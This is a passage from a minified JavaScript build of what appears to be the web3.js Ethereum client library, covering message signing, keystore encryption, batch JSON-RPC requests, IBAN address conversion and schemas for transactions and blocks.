                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const yf = (e, t) => {
                let n;
                if (!t && "string" === typeof e && _a(e) && 66 !== e.length) throw new _t;
                try {
                    n = ms(e) ? e : ws(e)
                } catch (ol) {
                    throw new It
                }
                if (!t && 32 !== n.byteLength) throw new _t;
                return n
            },
            bf = e => {
                const t = _a(e) ? e : Ps(e),
                    n = ks(t),
                    r = gs(ks(Ts("\x19Ethereum Signed Message:\n".concat(n.byteLength))), n);
                return _c(r)
            },
            wf = (e, t) => {
                const n = yf(t),
                    r = bf(e),
                    i = wd.sign(r.substring(2), n),
                    o = i.toCompactRawBytes(),
                    a = i.r.toString(16).padStart(64, "0"),
                    s = i.s.toString(16).padStart(64, "0"),
                    c = i.recovery + 27;
                return {
                    message: e,
                    messageHash: r,
                    v: Cs(c),
                    r: "0x".concat(a),
                    s: "0x".concat(s),
                    signature: "".concat(As(o)).concat(c.toString(16))
                }
            },
            xf = e => {
                if (ss(e)) throw new dn;
                const t = gf.fromSerializedData(ks(e));
                return Qs(t.getSenderAddress().toString())
            },
            Af = (e, t, n, r, i) => {
                if ("object" === typeof e) {
                    const t = "".concat(e.r).concat(e.s.slice(2)).concat(e.v.slice(2));
                    return Af(e.messageHash, t, n)
                }
                if ("string" === typeof t && "string" === typeof n && !ss(r)) {
                    const o = "".concat(n).concat(r.slice(2)).concat(t.slice(2));
                    return Af(e, o, i)
                }
                if (ss(t)) throw new Pt("signature string undefined");
                const o = n ? e : bf(e);
                let a = parseInt(t.substring(130), 16);
                a > 26 && (a -= 27);
                const s = wd.Signature.fromCompact(t.slice(2, 130)).addRecoveryBit(a).recoverPublicKey(o.replace("0x", "")).toRawBytes(!1),
                    c = _c(s.subarray(1));
                return Qs("0x".concat(c.slice(-40)))
            },
            kf = e => {
                const t = yf(e),
                    n = wd.getPublicKey(t, !1),
                    r = _c(n.slice(1)).slice(-40);
                return Qs("0x".concat(r))
            },
            Ef = (e, t) => {
                const n = yf(e);
                return "0x".concat(As(wd.getPublicKey(n, t)).slice(4))
            },
            Sf = (e, t, n) => vf(void 0, void 0, void 0, (function*() {
                var r, i, o, a, s, c, l;
                const u = yf(e);
                let d;
                if (d = (null === n || void 0 === n ? void 0 : n.salt) ? "string" === typeof n.salt ? ks(n.salt) : n.salt : jc(32), !Ca(t) && !ms(t)) throw new Ot;
                const f = "string" === typeof t ? ks(Ps(t)) : t;
                let h;
                if (null === n || void 0 === n ? void 0 : n.iv) {
                    if (h = "string" === typeof n.iv ? ks(n.iv) : n.iv, 16 !== h.length) throw new Rt
                } else h = jc(16);
                const p = null !== (r = null === n || void 0 === n ? void 0 : n.kdf) && void 0 !== r ? r : "scrypt";
                let m, g;
                if ("pbkdf2" === p) {
                    if (g = {
                            dklen: null !== (i = null === n || void 0 === n ? void 0 : n.dklen) && void 0 !== i ? i : 32,
                            salt: As(d).replace("0x", ""),
                            c: null !== (o = null === n || void 0 === n ? void 0 : n.c) && void 0 !== o ? o : 262144,
                            prf: "hmac-sha256"
                        }, g.c < 1e3) throw new Mt;
                    m = lu(f, d, g.c, g.dklen, "sha256")
                } else {
                    if ("scrypt" !== p) throw new Tt;
                    g = {
                        n: null !== (a = null === n || void 0 === n ? void 0 : n.n) && void 0 !== a ? a : 8192,
                        r: null !== (s = null === n || void 0 === n ? void 0 : n.r) && void 0 !== s ? s : 8,
                        p: null !== (c = null === n || void 0 === n ? void 0 : n.p) && void 0 !== c ? c : 1,
                        dklen: null !== (l = null === n || void 0 === n ? void 0 : n.dklen) && void 0 !== l ? l : 32,
                        salt: As(d).replace("0x", "")
                    }, m = mu(f, d, g.n, g.p, g.r, g.dklen)
                }
                const v = yield zl(u, m.slice(0, 16), h, "aes-128-ctr"), y = As(v).slice(2), b = _c(gs(m.slice(16, 32), v)).replace("0x", "");
                return {
                    version: 3,
                    id: Qc(),
                    address: kf(u).toLowerCase().replace("0x", ""),
                    crypto: {
                        ciphertext: y,
                        cipherparams: {
                            iv: As(h).replace("0x", "")
                        },
                        cipher: "aes-128-ctr",
                        kdf: p,
                        kdfparams: g,
                        mac: b
                    }
                }
            })),
            Cf = (e, t) => {
                const n = yf(e, t);
                return {
                    address: kf(n),
                    privateKey: As(n),
                    signTransaction: e => {
                        throw new zn("Do not have network access to sign the transaction")
                    },
                    sign: e => wf("string" === typeof e ? e : JSON.stringify(e), n),
                    encrypt: (e, t) => vf(void 0, void 0, void 0, (function*() {
                        return Sf(n, e, t)
                    }))
                }
            };
        var _f = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class If {
            constructor(e) {
                this._requestManager = e, this._requests = new Map
            }
            get requests() {
                return [...this._requests.values()].map((e => e.payload))
            }
            add(e) {
                const t = nl(e),
                    n = new sl;
                return this._requests.set(t.id, {
                    payload: t,
                    promise: n
                }), n
            }
            execute(e) {
                var t;
                return _f(this, void 0, void 0, (function*() {
                    if (0 === this.requests.length) return Promise.resolve([]);
                    const n = new sl({
                        timeout: null !== (t = null === e || void 0 === e ? void 0 : e.timeout) && void 0 !== t ? t : 1e3,
                        eagerStart: !0,
                        timeoutMessage: "Batch request timeout"
                    });
                    return this._processBatchRequest(n).catch((e => n.reject(e))), n.catch((e => {
                        e instanceof Yt && this._abortAllRequests("Batch request timeout"), n.reject(e)
                    })), n
                }))
            }
            _processBatchRequest(e) {
                var t, n;
                return _f(this, void 0, void 0, (function*() {
                    const r = yield this._requestManager.sendBatch([...this._requests.values()].map((e => e.payload)));
                    if (r.length !== this._requests.size) throw this._abortAllRequests("Invalid batch response"), new or(r, "Batch request size mismatch the results size. Requests: ".concat(this._requests.size, ", Responses: ").concat(r.length));
                    const i = this.requests.map((e => e.id)).map(Number).sort(((e, t) => e - t)),
                        o = r.map((e => e.id)).map(Number).sort(((e, t) => e - t));
                    if (JSON.stringify(i) !== JSON.stringify(o)) throw this._abortAllRequests("Invalid batch response"), new or(r, "Batch request mismatch the results. Requests: [".concat(i.join(), "], Responses: [").concat(o.join(), "]"));
                    for (const e of r) Vc(e) ? null === (t = this._requests.get(e.id)) || void 0 === t || t.promise.resolve(e.result) : Zc(e) && (null === (n = this._requests.get(e.id)) || void 0 === n || n.promise.reject(e.error));
                    e.resolve(r)
                }))
            }
            _abortAllRequests(e) {
                for (const {
                        promise: t
                    } of this._requests.values()) t.reject(new Xt(e))
            }
        }
        var Pf = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Tf extends gl {
            constructor(e) {
                var t;
                if (super(), this.providers = Nl.providers, cc(e) || "string" === typeof e && "" !== e.trim() || Il(e)) return this._requestManager = new Nl(e), void(this._subscriptionManager = new Rl(this._requestManager, {}));
                const {
                    config: n,
                    provider: r,
                    requestManager: i,
                    subscriptionManager: o,
                    registeredSubscriptions: a,
                    accountProvider: s,
                    wallet: c,
                    requestManagerMiddleware: l
                } = e;
                this.setConfig(null !== n && void 0 !== n ? n : {}), this._requestManager = null !== i && void 0 !== i ? i : new Nl(r, null === (t = null === n || void 0 === n ? void 0 : n.enableExperimentalFeatures) || void 0 === t ? void 0 : t.useSubscriptionWhenCheckingBlockTimeout, l), this._subscriptionManager = o || new Rl(this.requestManager, null !== a && void 0 !== a ? a : {}), s && (this._accountProvider = s), c && (this._wallet = c)
            }
            get requestManager() {
                return this._requestManager
            }
            get subscriptionManager() {
                return this._subscriptionManager
            }
            get wallet() {
                return this._wallet
            }
            get accountProvider() {
                return this._accountProvider
            }
            static fromContextObject() {
                for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                return new this(...t.reverse())
            }
            getContextObject() {
                var e;
                return {
                    config: this.config,
                    provider: this.provider,
                    requestManager: this.requestManager,
                    subscriptionManager: this.subscriptionManager,
                    registeredSubscriptions: null === (e = this.subscriptionManager) || void 0 === e ? void 0 : e.registeredSubscriptions,
                    providers: this.providers,
                    wallet: this.wallet,
                    accountProvider: this.accountProvider
                }
            }
            use(e) {
                for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
                const i = new e(...[...n, this.getContextObject()]);
                return this.on(ml.CONFIG_CHANGE, (e => {
                    i.setConfig({
                        [e.name]: e.newValue
                    })
                })), this[e.name] = i, i
            }
            link(e) {
                this.setConfig(e.config), this._requestManager = e.requestManager, this.provider = e.provider, this._subscriptionManager = e.subscriptionManager, this._wallet = e.wallet, this._accountProvider = e._accountProvider, e.on(ml.CONFIG_CHANGE, (e => {
                    this.setConfig({
                        [e.name]: e.newValue
                    })
                }))
            }
            registerPlugin(e) {
                if (void 0 !== this[e.pluginNamespace]) throw new en(e.pluginNamespace);
                const t = {
                    [e.pluginNamespace]: e
                };
                t[e.pluginNamespace].link(this), Object.assign(this, t)
            }
            get provider() {
                return this.currentProvider
            }
            set provider(e) {
                this.requestManager.setProvider(e)
            }
            get currentProvider() {
                return this.requestManager.provider
            }
            set currentProvider(e) {
                this.requestManager.setProvider(e)
            }
            get givenProvider() {
                return Tf.givenProvider
            }
            setProvider(e) {
                return this.provider = e, !0
            }
            setRequestManagerMiddleware(e) {
                this.requestManager.setMiddleware(e)
            }
            get BatchRequest() {
                return If.bind(void 0, this._requestManager)
            }
            extend(e) {
                var t, n = this;
                return e.property && !this[e.property] && (this[e.property] = {}), null === (t = e.methods) || void 0 === t || t.forEach((t => {
                    const r = function() {
                        for (var e = arguments.length, r = new Array(e), i = 0; i < e; i++) r[i] = arguments[i];
                        return Pf(n, void 0, void 0, (function*() {
                            return this.requestManager.send({
                                method: t.call,
                                params: r
                            })
                        }))
                    };
                    e.property ? this[e.property][t.name] = r : this[t.name] = r
                })), this
            }
        }
        Tf.providers = Nl.providers;
        class Bf {
            constructor(e) {
                if (this.toAddress = () => {
                        if (this.isDirect()) {
                            const e = this._iban.slice(4),
                                t = Bf._parseInt(e, 36),
                                n = pc(t, 40);
                            return Qs(n)
                        }
                        throw new Error("Iban is indirect and cannot be converted. Must be length of 34 or 35")
                    }, !Bf.isIndirect(e) && !Bf.isDirect(e)) throw new Error("Invalid IBAN was provided");
                this._iban = e
            }
            static isDirect(e) {
                return 34 === e.length || 35 === e.length
            }
            isDirect() {
                return Bf.isDirect(this._iban)
            }
            static isIndirect(e) {
                return 20 === e.length
            }
            isIndirect() {
                return Bf.isIndirect(this._iban)
            }
            static isValid(e) {
                return /^XE[0-9]{2}(ETH[0-9A-Z]{13}|[0-9A-Z]{30,31})$/.test(e) && 1 === Bf._mod9710(Bf._iso13616Prepare(e))
            }
            isValid() {
                return Bf.isValid(this._iban)
            }
            static fromBban(e) {
                const t = this._mod9710(this._iso13616Prepare("".concat("XE", "00").concat(e))),
                    n = "0".concat((98 - t).toString()).slice(-2);
                return new Bf("".concat("XE").concat(n).concat(e))
            }
            static createIndirect(e) {
                return Bf.fromBban("ETH".concat(e.institution).concat(e.identifier))
            }
            static fromAddress(e) {
                if (!Ya(e)) throw new Vn(e);
                const t = BigInt(Es(e)).toString(36),
                    n = pc(t, 15);
                return Bf.fromBban(n.toUpperCase())
            }
            static toIban(e) {
                return Bf.fromAddress(e).toString()
            }
            client() {
                return this.isIndirect() ? this._iban.slice(11) : ""
            }
            checksum() {
                return this._iban.slice(2, 4)
            }
            institution() {
                return this.isIndirect() ? this._iban.slice(7, 11) : ""
            }
            toString() {
                return this._iban
            }
        }
        Bf._iso13616Prepare = e => {
            const t = "A".charCodeAt(0),
                n = "Z".charCodeAt(0),
                r = e.toUpperCase();
            return "".concat(r.slice(4)).concat(r.slice(0, 4)).split("").map((e => {
                const r = e.charCodeAt(0);
                return r >= t && r <= n ? r - t + 10 : e
            })).join("")
        }, Bf._parseInt = (e, t) => [...e].reduce(((e, n) => BigInt(parseInt(n, t)) + BigInt(t) * e), BigInt(0)), Bf._mod9710 = e => {
            let t, n = e;
            for (; n.length > 2;) t = n.slice(0, 9), n = "".concat((parseInt(t, 10) % 97).toString()).concat(n.slice(t.length));
            return parseInt(n, 10) % 97
        }, Bf.toAddress = e => new Bf(e).toAddress();
        var Nf, Of = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Rf extends pl {
            constructor(e) {
                super(), this[Nf] = "Promise", this._promise = new Promise(e)
            }
            then(e, t) {
                return Of(this, void 0, void 0, (function*() {
                    return this._promise.then(e, t)
                }))
            } catch (e) {
                return Of(this, void 0, void 0, (function*() {
                    return this._promise.catch(e)
                }))
            } finally(e) {
                return Of(this, void 0, void 0, (function*() {
                    return this._promise.finally(e)
                }))
            }
            on(e, t) {
                return super.on(e, t), this
            }
            once(e, t) {
                return super.once(e, t), this
            }
        }
        Nf = Symbol.toStringTag;
        n(132);
        var Mf = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function jf(e) {
            return Mf(this, void 0, void 0, (function*() {
                return e.send({
                    method: "eth_syncing",
                    params: []
                })
            }))
        }

        function Ff(e, t) {
            return Mf(this, void 0, void 0, (function*() {
                return ps.validate(["hex"], [t]), e.send({
                    method: "eth_sendRawTransaction",
                    params: [t]
                })
            }))
        }

        function Lf(e, t, n) {
            return Mf(this, void 0, void 0, (function*() {
                return ps.validate(["blockNumberOrTag", "bool"], [t, n]), e.send({
                    method: "eth_getBlockByNumber",
                    params: [t, n]
                })
            }))
        }
        var Df = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        var Hf = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Uf = {
                type: "object",
                properties: {
                    accessList: {
                        type: "null"
                    },
                    maxFeePerGas: {
                        type: "null"
                    },
                    maxPriorityFeePerGas: {
                        type: "null"
                    }
                }
            },
            zf = {
                type: "object",
                properties: {
                    maxFeePerGas: {
                        type: "null"
                    },
                    maxPriorityFeePerGas: {
                        type: "null"
                    }
                }
            },
            Gf = {
                type: "object",
                properties: {
                    gasPrice: {
                        type: "null"
                    }
                }
            },
            qf = (e, t, n) => {
                try {
                    ps.validateJSONSchema(e, t)
                } catch (r) {
                    if (r instanceof ka) throw new qn(r.errors, n);
                    throw r
                }
            },
            Qf = e => {
                var t, n;
                const r = e;
                if (!ss(r.type)) {
                    let e;
                    switch (r.type) {
                        case "0x0":
                            e = Uf;
                            break;
                        case "0x1":
                            e = zf;
                            break;
                        case "0x2":
                            e = Gf;
                            break;
                        default:
                            return kc({
                                format: "uint"
                            }, r.type, $e)
                    }
                    return qf(e, r, r.type), kc({
                        format: "uint"
                    }, r.type, $e)
                }
                if (!ss(r.maxFeePerGas) || !ss(r.maxPriorityFeePerGas)) return qf(Gf, r, "0x2"), "0x2";
                if (!ss(r.accessList)) return qf(zf, r, "0x1"), "0x1";
                const i = null !== (t = r.hardfork) && void 0 !== t ? t : null === (n = r.common) || void 0 === n ? void 0 : n.hardfork;
                if (!ss(i)) {
                    const e = Object.keys(tt).indexOf(i);
                    if (e >= Object.keys(tt).indexOf("london")) return ss(r.gasPrice) ? "0x2" : "0x0";
                    if (e === Object.keys(tt).indexOf("berlin")) return "0x0"
                }
                return ss(r.gasPrice) ? void 0 : (qf(Uf, r, "0x0"), "0x0")
            },
            Wf = (e, t) => {
                var n;
                return (null !== (n = null === t || void 0 === t ? void 0 : t.transactionTypeParser) && void 0 !== n ? n : Qf)(e)
            },
            Vf = e => e[0] > 127 ? "0x0" : Hs(e[0]),
            Zf = {
                type: "array",
                items: Object.assign({}, {
                    type: "object",
                    properties: {
                        address: {
                            format: "address"
                        },
                        storageKeys: {
                            type: "array",
                            items: {
                                format: "bytes32"
                            }
                        }
                    }
                })
            },
            Kf = {
                type: "object",
                properties: {
                    accessList: Object.assign({}, Zf),
                    gasUsed: {
                        type: "string"
                    }
                }
            },
            Jf = {
                type: "string",
                enum: ["goerli", "kovan", "mainnet", "rinkeby", "ropsten", "sepolia"]
            },
            Yf = {
                type: "string",
                enum: ["arrowGlacier", "berlin", "byzantium", "chainstart", "constantinople", "dao", "homestead", "istanbul", "london", "merge", "muirGlacier", "petersburg", "shanghai", "spuriousDragon", "tangerineWhistle"]
            },
            Xf = {
                type: "object",
                properties: {
                    from: {
                        format: "address"
                    },
                    to: {
                        oneOf: [{
                            format: "address"
                        }, {
                            type: "null"
                        }]
                    },
                    value: {
                        format: "uint"
                    },
                    gas: {
                        format: "uint"
                    },
                    gasPrice: {
                        format: "uint"
                    },
                    effectiveGasPrice: {
                        format: "uint"
                    },
                    type: {
                        format: "uint"
                    },
                    maxFeePerGas: {
                        format: "uint"
                    },
                    maxPriorityFeePerGas: {
                        format: "uint"
                    },
                    accessList: Object.assign({}, Zf),
                    data: {
                        format: "bytes"
                    },
                    input: {
                        format: "bytes"
                    },
                    nonce: {
                        format: "uint"
                    },
                    chain: Object.assign({}, Jf),
                    hardfork: Object.assign({}, Yf),
                    chainId: {
                        format: "uint"
                    },
                    networkId: {
                        format: "uint"
                    },
                    common: {
                        type: "object",
                        properties: {
                            customChain: Object.assign({}, {
                                type: "object",
                                properties: {
                                    name: {
                                        format: "string"
                                    },
                                    networkId: {
                                        format: "uint"
                                    },
                                    chainId: {
                                        format: "uint"
                                    }
                                }
                            }),
                            baseChain: Object.assign({}, Jf),
                            hardfork: Object.assign({}, Yf)
                        }
                    },
                    gasLimit: {
                        format: "uint"
                    },
                    v: {
                        format: "uint"
                    },
                    r: {
                        format: "bytes32"
                    },
                    s: {
                        format: "bytes32"
                    }
                }
            },
            $f = {
                type: "object",
                properties: Object.assign(Object.assign({}, Xf.properties), {
                    blockHash: {
                        format: "bytes32"
                    },
                    blockNumber: {
                        format: "uint"
                    },
                    hash: {
                        format: "bytes32"
                    },
                    transactionIndex: {
                        format: "uint"
                    },
                    from: {
                        format: "address"
                    },
                    to: {
                        oneOf: [{
                            format: "address"
                        }, {
                            type: "null"
                        }]
                    },
                    value: {
                        format: "uint"
                    },
                    gas: {
                        format: "uint"
                    },
                    gasPrice: {
                        format: "uint"
                    },
                    effectiveGasPrice: {
                        format: "uint"
                    },
                    type: {
                        format: "uint"
                    },
                    maxFeePerGas: {
                        format: "uint"
                    },
                    maxPriorityFeePerGas: {
                        format: "uint"
                    },
                    accessList: Object.assign({}, Zf),
                    data: {
                        format: "bytes"
                    },
                    input: {
                        format: "bytes"
                    },
                    nonce: {
                        format: "uint"
                    },
                    gasLimit: {
                        format: "uint"
                    },
                    v: {
                        format: "uint"
                    },
                    r: {
                        format: "bytes32"
                    },
                    s: {
                        format: "bytes32"
                    }
                })
            },
            eh = {
                type: "object",
                properties: {
                    index: {
                        format: "uint"
                    },
                    validatorIndex: {
                        format: "uint"
                    },
                    address: {
                        format: "address"
                    },
                    amount: {
                        format: "uint"
                    }
                }
            },
            th = {
                type: "object",
                properties: {
                    baseFeePerGas: {
                        format: "uint"
                    },
                    blobGasUsed: {
                        format: "uint"
                    },
                    difficulty: {
                        format: "uint"
                    },
                    excessBlobGas: {
                        format: "uint"
                    },
                    extraData: {
                        format: "bytes"
                    },
                    gasLimit: {
                        format: "uint"
                    },
                    gasUsed: {
                        format: "uint"
                    },
                    hash: {
                        format: "bytes32"
                    },
                    logsBloom: {
                        format: "bytes256"
                    },
                    miner: {
                        format: "bytes"
                    },
                    mixHash: {
                        format: "bytes32"
                    },
                    nonce: {
                        format: "uint"
                    },
                    number: {
                        format: "uint"
                    },
                    parentBeaconBlockRoot: {
                        format: "bytes32"
                    },
                    parentHash: {
                        format: "bytes32"
                    },
                    receiptsRoot: {
                        format: "bytes32"
                    },
                    sha3Uncles: {
                        format: "bytes32"
                    },
                    size: {
                        format: "uint"
                    },
                    stateRoot: {
                        format: "bytes32"
                    },
                    timestamp: {
                        format: "uint"
                    },
                    totalDifficulty: {
                        format: "uint"
                    },
                    transactions: {
                        oneOf: [{
                            type: "array",
                            items: Object.assign({}, $f)
                        }, {
                            type: "array",
                            items: {
                                format: "bytes32"
                            }
                        }]
                    },
                    transactionsRoot: {
                        format: "bytes32"
                    },
                    uncles: {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    },
                    withdrawals: {
                        type: "array",
                        items: Object.assign({}, eh)
                    },
                    withdrawalsRoot: {
                        format: "bytes32"
                    }
                }
            },
            nh = {
                type: "object",
                properties: {
                    author: {
                        format: "bytes32"
                    },
                    excessDataGas: {
                        format: "uint"
                    },
                    baseFeePerGas: {
                        format: "uint"
                    },
                    blobGasUsed: {
                        format: "uint"
                    },
                    difficulty: {
                        format: "uint"
                    },
                    excessBlobGas: {
                        format: "uint"
                    },
                    extraData: {
                        format: "bytes"
                    },
                    gasLimit: {
                        format: "uint"
                    },
                    gasUsed: {
                        format: "uint"
                    },
                    hash: {
                        format: "bytes32"
                    },
                    logsBloom: {
                        format: "bytes256"
                    },
                    miner: {
                        format: "bytes"
                    },
                    mixHash: {
                        format: "bytes32"
                    },
                    nonce: {
                        format: "uint"
                    },
                    number: {
                        format: "uint"
                    },
                    parentBeaconBlockRoot: {
                        format: "bytes32"
                    },
                    parentHash: {
                        format: "bytes32"
                    },
                    receiptsRoot: {
                        format: "bytes32"
                    },
                    sha3Uncles: {
                        format: "bytes32"
                    },
                    size: {
                        format: "uint"
                    },
                    stateRoot: {
                        format: "bytes32"
                    },
                    timestamp: {
                        format: "uint"
                    },
                    totalDifficulty: {
                        format: "uint"
                    },
                    transactions: {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    },
                    transactionsRoot: {
                        format: "bytes32"
                    },
                    uncles: {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    },
                    withdrawals: {
                        type: "array",
                        items: Object.assign({}, eh)
                    },
                    withdrawalsRoot: {
                        format: "bytes32"
                    }
                }
            },
            rh = {
                type: "object",
                properties: {
                    removed: {
                        format: "bool"
                    },
                    logIndex: {
                        format: "uint"
                    },
                    transactionIndex: {
                        format: "uint"
                    },
                    transactionHash: {
                        format: "bytes32"
                    },
                    blockHash: {
                        format: "bytes32"
                    },
                    blockNumber: {
                        format: "uint"
                    },
                    address: {
                        format: "address"
                    },
                    data: {
                        format: "bytes"
                    },
                    topics: {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    }
                }
            },
            ih = {
                type: "object",
                properties: {
                    startingBlock: {
                        format: "string"
                    },
                    currentBlock: {
                        format: "string"
                    },
                    highestBlock: {
                        format: "string"
                    },
                    knownStates: {
                        format: "string"
                    },
                    pulledStates: {
                        format: "string"
                    }
                }
            },
            oh = {
                type: "object",
                properties: {
                    transactionHash: {
                        format: "bytes32"
                    },
                    transactionIndex: {
                        format: "uint"
                    },
                    blockHash: {
                        format: "bytes32"
                    },
                    blockNumber: {
                        format: "uint"
                    },
                    from: {
                        format: "address"
                    },
                    to: {
                        format: "address"
                    },
                    cumulativeGasUsed: {
                        format: "uint"
                    },
                    gasUsed: {
                        format: "uint"
                    },
                    effectiveGasPrice: {
                        format: "uint"
                    },
                    contractAddress: {
                        format: "address"
                    },
                    logs: {
                        type: "array",
                        items: Object.assign({}, rh)
                    },
                    logsBloom: {
                        format: "bytes"
                    },
                    root: {
                        format: "bytes"
                    },
                    status: {
                        format: "uint"
                    },
                    type: {
                        format: "uint"
                    }
                }
            },
            ah = {
                type: "object",
                properties: {
                    messageHash: {
                        format: "bytes"
                    },
                    r: {
                        format: "bytes32"
                    },
                    s: {
                        format: "bytes32"
                    },
                    v: {
                        format: "bytes"
                    },
                    message: {
                        format: "bytes"
                    },
                    signature: {
                        format: "bytes"
                    }
                }
            },
            sh = {
                type: "object",
                properties: {
                    oldestBlock: {
                        format: "uint"
                    },
                    baseFeePerGas: {
                        type: "array",
                        items: {
                            format: "uint"
                        }
                    },
                    reward: {
                        type: "array",
                        items: {
                            type: "array",
                            items: {
                                format: "uint"
                            }
                        }
                    },
                    gasUsedRatio: {
                        type: "array",
                        items: {
                            type: "number"
                        }
                    }
                }
            },
            ch = {
                type: "object",
                properties: {
                    balance: {
                        format: "uint"
                    },
                    codeHash: {
                        format: "bytes32"
                    },
                    nonce: {
                        format: "uint"
                    },
                    storageHash: {
                        format: "bytes32"
                    },
                    accountProof: {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    },
                    storageProof: {
                        type: "array",
                        items: Object.assign({}, {
                            type: "object",
                            properties: {
                                key: {
                                    format: "bytes32"
                                },
                                value: {
                                    format: "uint"
                                },
                                proof: {
                                    type: "array",
                                    items: {
                                        format: "bytes32"
                                    }
                                }
                            }
                        })
                    }
                }
            };

        function lh(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Xe,
                n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                    transactionSchema: $f,
                    fillInputAndData: !1
                };
            var r, i;
            let o = uc({}, e);
            if (ss(null === e || void 0 === e ? void 0 : e.common) || (o.common = Object.assign({}, e.common), ss(null === (r = e.common) || void 0 === r ? void 0 : r.customChain) || (o.common.customChain = Object.assign({}, e.common.customChain))), o = kc(null !== (i = n.transactionSchema) && void 0 !== i ? i : $f, o, t), !ss(o.data) && !ss(o.input) && Hs(o.data) !== Hs(o.input)) throw new Mn({
                data: As(o.data),
                input: As(o.input)
            });
            return n.fillInputAndData && (ss(o.data) ? ss(o.input) || (o.data = o.input) : o.input = o.data), ss(o.gasLimit) || (o.gas = o.gasLimit, delete o.gasLimit), o
        }
        var uh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function dh(e, t) {
            return uh(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Df(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "net_version",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, t)
            }))
        }

        function fh(e, t) {
            return uh(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Df(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "net_peerCount",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, t)
            }))
        }
        const hh = e => uh(void 0, void 0, void 0, (function*() {
            return function(e) {
                return Df(this, void 0, void 0, (function*() {
                    return e.send({
                        method: "net_listening",
                        params: []
                    })
                }))
            }(e.requestManager)
        }));
        var ph = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class mh extends Tf {
